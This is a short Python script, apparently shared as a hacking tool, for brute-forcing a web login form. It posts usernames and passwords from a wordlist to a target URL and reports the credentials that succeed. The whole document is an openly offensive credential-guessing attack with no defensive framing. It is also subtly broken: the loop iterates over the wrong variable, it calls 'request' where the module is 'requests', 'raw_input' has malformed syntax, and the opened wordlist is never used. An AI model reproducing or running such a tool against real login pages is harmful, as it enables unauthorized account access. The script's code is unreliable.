#created by @hackhubafrica
#inspect login form to check for variables fieldsets and elements

import requests


def bruteforce(username,url):
	for password in password:
		password = password.strip()
		print("!!Trying to brute with passwords: " + password)
		data_dictionary = {"username":username , "password":password , "Login":"submit"}
		response = request.post(url,data=data_dictionary)
		if "Login failed" in response.content:
			pass
		else:
			print("[+]username:-->" + username)
			print("[+]password:-->" + password)
			exit()




page_url = ""  #paste target url
username = raw_input"Enter username for specified page: "


with open("passlist.txt","r") as passwords:
	bruteforce(username,page_url)


print("!!!Password is not in the list!")
